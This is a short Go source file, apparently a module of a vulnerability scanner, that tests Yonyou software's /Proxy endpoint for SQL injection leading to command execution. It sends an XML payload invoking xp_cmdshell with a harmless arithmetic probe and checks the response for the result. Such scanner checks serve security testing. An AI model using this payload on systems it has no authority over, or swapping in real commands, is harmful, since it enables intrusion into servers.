package yonyou

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

//ProxySql 注入漏洞
func ProxySql(u string) bool {
	data := `cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec /**/xp_cmdshell 'set/A 999*999'</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>`
	if req, err := pkg.HttpRequset(u+"/Proxy", "POST", data, false, nil); err == nil {
		if strings.Contains(req.Body, "<SESSIONID>") && strings.Contains(req.Body, "998001") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln yonyou ProxySql-rce|%s\n", u+"/Proxy"))
			return true
		}
	}
	return false
}
